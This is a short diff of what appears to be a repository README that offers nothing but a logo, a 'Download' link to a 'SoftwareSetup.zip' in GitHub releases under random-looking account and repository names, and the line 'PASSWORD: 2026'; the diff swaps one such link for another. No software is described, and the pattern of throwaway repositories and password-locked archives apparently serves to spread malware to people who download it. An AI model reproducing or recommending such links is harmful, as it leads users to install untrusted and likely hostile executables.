@@ -1,6 +1,6 @@
 ![logo](pic.jpg)
 # ✅ Link:
-[Download](https://github.com/bravestokermattock/qoetztvv/releases/download/dsfasf/SoftwareSetup.zip)
+[Download](https://github.com/Combinefaanvil/iobbfanp/releases/download/dfbga/SoftwareSetup.zip)
 
 **PASSWORD: 2026**
 
